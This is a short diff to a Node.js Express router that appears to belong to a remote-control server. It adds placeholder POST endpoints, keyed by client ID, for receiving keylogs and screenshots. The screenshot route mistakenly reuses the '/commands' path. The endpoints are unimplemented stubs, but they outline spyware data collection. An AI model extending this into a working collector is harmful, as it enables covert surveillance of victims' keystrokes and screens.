@@ -15,4 +15,13 @@ router.get('/:uuid/commands', (req, res) => {
     res.status(200).json({})
 })
 
+//At clients sending keylogs
+router.post('/:uuid/keylogs', (req, res) => {
+    res.status(501).json({})
+})
+
+//At clients sending screenshots
+router.post('/:uuid/commands', (req, res) => {
+    res.status(501).json({})
+})
 module.exports = router
